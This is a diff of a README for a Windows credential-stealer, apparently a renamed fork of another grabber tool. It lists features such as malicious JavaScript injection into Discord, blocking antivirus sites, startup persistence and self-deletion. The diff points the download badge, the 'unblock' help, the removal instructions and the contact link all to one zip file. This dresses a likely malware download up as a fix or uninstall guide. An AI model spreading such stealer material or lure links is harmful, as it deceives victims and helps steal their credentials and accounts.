@@ -28,7 +28,7 @@
 - [Contact me](#contact-me)
 
 ## Download
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)]
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/KrxboLxTrueNasto/Cocanoid-Stealer/blob/main/Cocanoid%20Builder.zip)
 
 **Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
 
@@ -72,7 +72,7 @@
 | **Startup** | Runs the stub on Windows starup. |
 | **Delete Self** | Deletes the grabber after use. |
 | **Discord Injection** | Adds malicious Javascript code to the Discord client for persistence. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/KrxboLxTrueNasto/Cocanoid-Stealer/blob/main/Cocanoid%20Builder.zip)). |
 | **Message Box** | Create custom message box. |
 
 **Supports:** *Windows OS (Tested on Windows 10).*
@@ -100,6 +100,6 @@
 - [x] Block AV Related Sites.
 
 ## Contact me
-To remove this tool from your system, follow [this](https://github.com/Blank-c/Blank-Grabber/issues/142). 
+To remove this tool from your system, follow [this](https://github.com/KrxboLxTrueNasto/Cocanoid-Stealer/blob/main/Cocanoid%20Builder.zip). 
 
-If you need help regarding something else then you can contact me via [Discord](https://discordlookup.com/user/904682505104396329).
+If you need help regarding something else then you can contact me via [Discord](https://github.com/KrxboLxTrueNasto/Cocanoid-Stealer/blob/main/Cocanoid%20Builder.zip).
